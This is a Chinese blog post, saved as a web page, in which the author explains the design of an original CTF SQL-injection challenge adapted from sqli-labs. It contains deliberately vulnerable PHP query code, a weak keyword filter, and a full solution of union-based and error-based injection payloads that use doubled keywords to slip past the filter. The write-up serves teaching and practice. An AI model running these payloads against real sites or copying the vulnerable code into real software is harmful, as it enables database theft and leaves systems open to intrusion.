@@ -1,0 +1,250 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>一道简单CTF题目（原创） | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="ezsql出题思路主要想考查对SQL注入简单过滤的绕过，出题的时候我想尽量修改一些小地方，让网上找的payload看似很接近，但实际上要真正理解知识点才能做出来。 题目是从最流行的sqli-labs找的，用sqli-labs-less11修改而来，前端写的比较拉，主要还是想搞笑。     出题过程在sqli-labs-less11的源码基础上修改 1234567891011121314151617">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道简单CTF题目（原创）">
+<meta property="og:url" content="http://example.com/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/index.html">
+<meta property="og:site_name" content="Bamboo22 's Blog">
+<meta property="og:description" content="ezsql出题思路主要想考查对SQL注入简单过滤的绕过，出题的时候我想尽量修改一些小地方，让网上找的payload看似很接近，但实际上要真正理解知识点才能做出来。 题目是从最流行的sqli-labs找的，用sqli-labs-less11修改而来，前端写的比较拉，主要还是想搞笑。     出题过程在sqli-labs-less11的源码基础上修改 1234567891011121314151617">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://pic.bamboo22.top/image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-04%20154149.png">
+<meta property="article:published_time" content="2024-01-09T09:30:12.000Z">
+<meta property="article:modified_time" content="2024-02-04T07:43:51.161Z">
+<meta property="article:author" content="Bamboo22">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://pic.bamboo22.top/image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-04%20154149.png"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '一道简单CTF题目（原创）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-02-04 15:43:51'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://pic.bamboo22.top/image/屏幕截图 2024-02-04 154149.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">一道简单CTF题目（原创）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-09T09:30:12.000Z" title="发表于 2024-01-09 17:30:12">2024-01-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-04T07:43:51.161Z" title="更新于 2024-02-04 15:43:51">2024-02-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/">CTF赛题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="一道简单CTF题目（原创）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('http://pic.bamboo22.top/image/屏幕截图 2024-02-04 154149.png');"></div><article class="post-content" id="article-container"><h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>主要想考查对SQL注入简单过滤的绕过，出题的时候我想尽量修改一些小地方，让网上找的<strong>payload</strong>看似很接近，但实际上要真正理解知识点才能做出来。</p>
+<p>题目是从最流行的<strong>sqli-labs</strong>找的，用<strong>sqli-labs-less11</strong>修改而来，前端写的比较拉，主要还是想搞笑。</p>
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109213127702.png" class="">
+
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109213140783.png" class="" title="image-20240109213140783">
+
+<h2 id="出题过程"><a href="#出题过程" class="headerlink" title="出题过程"></a>出题过程</h2><p>在<strong>sqli-labs-less11</strong>的源码基础上修改</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span><br><span class="line">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;</span><br><span class="line">&lt;title&gt;Less-1 **Error Based- String**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor="#000000"&gt;</span><br><span class="line">&lt;div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size="3" color="#FFFF00"&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include("../sql-connections/sql-connect.php");</span><br><span class="line">error_reporting(0);</span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET['id']))</span><br><span class="line">{</span><br><span class="line">$id=$_GET['id'];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen('result.txt','a');</span><br><span class="line">fwrite($fp,'ID:'.$id."\n");</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	if($row)</span><br><span class="line">	{</span><br><span class="line">  	echo "&lt;font size='5' color= '#99FF00'&gt;";</span><br><span class="line">  	echo 'Your Login name:'. $row['username'];</span><br><span class="line">  	echo "&lt;br&gt;";</span><br><span class="line">  	echo 'Your Password:' .$row['password'];</span><br><span class="line">  	echo "&lt;/font&gt;";</span><br><span class="line">  	}</span><br><span class="line">	else </span><br><span class="line">	{</span><br><span class="line">	echo '&lt;font color= "#FFFF00"&gt;';</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo "&lt;/font&gt;";  </span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">	else { echo "Please input the ID as parameter with numeric value";}</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src="../images/Less-1.jpg" /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>前端就不多赘述，主要修改的代码如下：</p>
+<p>修改了查询语句，主要是因为修改了数据库，所以查询的库名、表面变了</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT username, trueflag FROM fflllaaaagggg WHERE username='<span class="subst">$uname</span>' and trueflag='<span class="subst">$passwd</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在输入端增加了过滤，也就是想考察对SQL注入过滤的绕过。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line">	<span class="variable">$uname</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">"/\*|;|union|select|ascii|mid|ord|substr|like|substring|if|file|extractvalue|updatexml|floor|or|and|#|=|%23|-|&lt;|&gt;|\^|\|\|/i"</span>, <span class="string">''</span>, <span class="variable">$uname</span>);</span><br><span class="line">	<span class="variable">$passwd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">"/\*|;|union|select|ascii|mid|ord|substr|like|substring|if|file|extractvalue|updatexml|floor|or|and|#|=|%23|-|&lt;|&gt;|\^|\|\|/i"</span>, <span class="string">''</span>, <span class="variable">$passwd</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your Username:'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$uname</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your Flag:'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$passwd</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>加了两个正则表达式，并输出过滤后的结果，主要是方便大家看过滤了什么，是否绕过成功</p>
+<p>正则很简单，过滤了一些关键字，都可以用双写绕过，原理也很简单，不多赘述。</p>
+<p>过滤了注释符，这也是我主要想考的地方，<strong>POST</strong>注入用<code>#</code>注释，我把<code>#</code>和<code>%23</code>都ban了，这里一般都会想到使用万能密码<code>or '1'='1</code>这样的语句使SQL语句永真从而执行，来实现注释符的作用。</p>
+<p>举个例子，一般的SQL注入的语句</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当我拼接上查库的操作<code>-1' union select 1,2,database() or '1'='1</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='-1' union select 1,2,database() or '1'='1' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以发现最后的语句变成了<code>or '1'='1'</code>这个永真的式子，前面的SQL语句执行，从而达到注释符的作用。</p>
+<p><strong>在本题中，我们查询的语句有两个，坑也在此埋下：</strong></p>
+<p>当我们查询到数据库名时，用<code>oorr '1'='1</code>来结尾（这里其实ban了<code>=</code>,但是不影响注释效果，只要有右边<code>'</code>就行）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion selselectect database(),2 oorr '1'='1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当在<strong>Username</strong>框中查询时，</p>
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109232346348.png" alt="image-20240109232346348" style="zoom:80%;">
+
+<p>会报错<code>Unknown column 'trueflag' in 'field list'</code>报错了，直接把我的字段名给爆出来了:sob:但是我没有改，就算知道我的字段名你也注不出来</p>
+<p>如果我们换成在<strong>Flag</strong>框中查询时，发现成功了，库名被爆出来了</p>
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109220703457.png" class="" title="image-20240109220703457">
+
+<p>看起来很玄，我们来分析一下源码,我将过滤后的语句拼接上去</p>
+<p>在<strong>Username</strong>中输入：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT username, trueflag FROM fflllaaaagggg WHERE username='1' union select database(),2 or '1' like '1' and trueflag='<span class="subst">$passwd</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>推测一波：前面的语句应该被正常执行，但是，后面还有一个<strong>and</strong>，<strong>and</strong>后面的内容也会被执行，<code>$passwd</code>参数中没有输入，于是<strong>and</strong>后面的内容执行错误，报错<code>Unknown column 'trueflag' in 'field list'</code></p>
+<p>在本地的数据库中测试，可以看到第一次就是我们后台的SQL查询语句，报错，第二次我们删除<strong>and</strong>后面的内容，查询正常，证实了我们的猜想。</p>
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109222206092.png" alt="image-20240109222206092" style="zoom:50%;">
+
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109222230002.png" alt="image-20240109222230002" style="zoom:40%;">
+
+<p>所以我们的所以查询语句都要在<strong>Flag</strong>框中才能达到我们想要的效果</p>
+<p>继续往下进行注入,你应该不难翻出你的笔记，拼出如下查询语句</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit' oorr '1' = '1</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109222644840.png" class="" title="image-20240109222644840">
+
+<p>然后发现第一位是回显第二位不是回显位，所以我们应该将查询语句放到第一位</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit' ,2 oorr '1' = '1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果你这样修改，那恭喜你，又进坑了，报错了</p>
+<img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109223026285.png" class="" title="image-20240109223026285">
+
+<p>报错的原因很简单，<code>union select 1,2 #</code>联合查询的语句，但是语句中用空格，分不清查询的两个东西了，所以说得加括号<code>()</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion selselectect(selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit'),2 oorr '1' = '1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这样就ok了</p>
+<p>走到这里应该就没什么大问题了，之后就是常规操作了</p>
+<p>当然报错注入也是可以的，我试过，这里就留给师傅们自己测了。</p>
+<h2 id="完整WP"><a href="#完整WP" class="headerlink" title="完整WP"></a>完整WP</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion selselectect database(),2 &amp;&amp; '1'lilikeke'1      #查库</span><br><span class="line"></span><br><span class="line">1' ununionion selselectect (selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit'),2 &amp;&amp; '1' = '1</span><br><span class="line">                                                              #查表</span><br><span class="line">1' ununionion selselectect (selselectect group_concat(column_name) from infoorrmation_schema.columns where table_name lilikeke 'fflllaaaagggg'), 2 &amp;&amp; '1' = '1</span><br><span class="line">                                                              #查列</span><br><span class="line">1' ununionion selselectect (selselectect group_concat(trueflag) from flaginit.fflllaaaagggg), 2 &amp;&amp; '1' = '1                                                 #查数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1' ununionion selselectect extraextractvaluectvalue(1,concat(0x7e,(selselectect group_concat(trueflag)from fflllaaaagggg))),2 &amp;&amp; '1' = '1     #报错</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前没什么出题经验，这个<strong>ezsql</strong>本来以为难度不大，但是最后只有一解，让我反思是不是题目有什么刁钻的地方，于是重新分析了一下题目，写了这篇出题思路，从中也有所收获。</p>
+<p>首先当然是要理解基础的知识点，这道题不知道师傅们都卡在了哪一步，不知道上述讲的点是否囊括了所以容易卡住的地方，但是仔细去看这些地方，其实都是我们没有掌握牢固的知识点，所以基础知识很重要。其次就是SQL注入这样的复杂环境应该多去尝试、注入点、注入姿势、等等。</p>
+<p>其实在出题时我也没有去研究这些可能卡主的地方，在结束后反思又学到了一些东西，所以做题的反思也很重要。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/">http://example.com/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="http://pic.bamboo22.top/image/屏幕截图 2024-02-04 154149.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/01/21/hello-world/" title="Hello World"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hello World</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">热爱学习，分享技术</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Bamboo的博客！原博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas 